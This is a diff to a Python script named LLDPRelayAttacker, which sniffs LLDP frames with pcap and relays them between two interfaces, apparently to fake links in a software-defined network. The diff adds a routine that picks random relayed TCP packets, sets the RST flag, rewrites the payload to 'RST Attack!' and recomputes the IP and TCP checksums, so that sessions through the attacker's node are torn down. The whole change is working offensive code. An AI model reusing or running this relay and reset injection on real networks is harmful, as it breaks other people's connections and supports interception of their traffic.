@@ -1,16 +1,17 @@
-import time
 import pcap
+import dpkt
+import random
+import struct 
 from optparse import OptionParser
 
-# Notice: any modification packet in immediate node (even if only relay packets) 
-# should turn off the checksum of tx and rx.
-# Command: 
-#   ethtool -K tx off 
-#   ethtool -K rx off
-
 class LLDPRelayAttacker(object):
+    '''
+    bind_iface: the binding interface to sniff LLDP packets.
+    relay_ends: relay the LLDP to the ends through UDP sockets. 
+    '''
     def __init__(self, in_dev, out_dev, fwd_all):
         self._init_pcap(in_dev, out_dev, fwd_all)
+        self.rst_rate = 0.05
 
     def _init_pcap(self, in_dev, out_dev, fwd_all):
         
@@ -19,17 +20,40 @@ class LLDPRelayAttacker(object):
         if not int(fwd_all):
             filter_strategy = 'ether proto 0x88cc'
         else:
-            filter_strategy = 'ether proto 0x88cc or \
+            filter_strategy = 'tcp or (ether proto 0x88cc) or tcp port 9527 or \
                 (not ether dst host ff:ff:ff:ff:ff:ff and \
                  not ether src host 00:00:de:ad:be:ef)'
         self.in_handler.setfilter(filter_strategy)
         self.out_handler = pcap.pcap(out_dev)
 
-    # Since we only focus on LLDP packets, thus ignore other packets here.
-    # In reality, to further raise eavesdropping attack, all the packets should 
-    # be forwarded (relayed). However, the function can be realized in other modules.    
+    def reset_session(self, eth):
+        if not isinstance(eth.data, dpkt.ip.IP):
+            return None 
+        ip = eth.data
+        if not isinstance(ip.data, dpkt.tcp.TCP):
+            return None
+        if random.random() > self.rst_rate:
+            return None
+        tcp = ip.data
+        # set rst flag
+        tcp.flags |= dpkt.tcp.TH_RST 
+        # recalculate TCP checksum
+        tcp.data = b'RST Attack!'
+        pseudo_hdr = struct.pack('!4s4sHH', ip.src, ip.dst, ip.p, len(tcp))
+        tcp.sum = 0
+        tcp.sum = dpkt.in_cksum(pseudo_hdr + tcp.pack())
+        # recalculate IP len and checksum
+        ip.len = ip.hl * 4 + len(tcp)
+        ip.sum = 0
+        ip.sum = dpkt.in_cksum(ip.pack_hdr())
+        return eth.pack()
+         
     def _loop_capture(self, pcap_handler):
         for _, pdata in pcap_handler:
+            eth = dpkt.ethernet.Ethernet(pdata)
+            reset_data = self.reset_session(eth)
+            if reset_data:
+                pdata = reset_data
             self.out_handler.sendpacket(pdata)
 
     def run(self):
